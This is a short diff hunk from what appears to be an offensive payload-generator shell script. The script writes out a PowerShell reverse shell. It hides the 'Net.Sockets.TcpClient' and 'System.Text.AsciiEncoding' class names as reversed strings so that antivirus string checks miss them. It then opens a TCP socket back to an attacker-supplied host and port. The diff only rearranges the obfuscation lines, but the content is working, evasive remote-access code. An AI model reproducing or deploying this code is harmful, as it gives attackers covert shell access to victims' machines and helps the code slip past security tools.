@@ -12161,8 +12161,9 @@ echo "Original shell: @int0x33" >> $IPATH/output/$NaM.ps1
 echo "#>" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "write-Host \"Please Wait, Executing PS Application ..\" -ForeGroundColor green -BackGroundColor black;" >> $IPATH/output/$NaM.ps1
-echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);\$NewObjectCommand = (\$Constructor -Join '');" >> $IPATH/output/$NaM.ps1
-echo "\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
+echo "\$MethodInvocation = \"tneilCpcT.stekcoS.teN\";\$Constructor = \$MethodInvocation.ToCharArray();[Array]::Reverse(\$Constructor);" >> $IPATH/output/$NaM.ps1
+echo "\$NewObjectCommand = (\$Constructor -Join '');\$assembly = \"gnidocnEiicsA.txeT.metsyS\";\$CmdCharArray = \$assembly.ToCharArray();" >> $IPATH/output/$NaM.ps1
+echo "[Array]::Reverse(\$CmdCharArray);\$PSArgException = (\$CmdCharArray -Join '');" >> $IPATH/output/$NaM.ps1
 echo "" >> $IPATH/output/$NaM.ps1
 echo "\$socket = New-Object \$NewObjectCommand('$lhost', $lport)" >> $IPATH/output/$NaM.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/$NaM.ps1
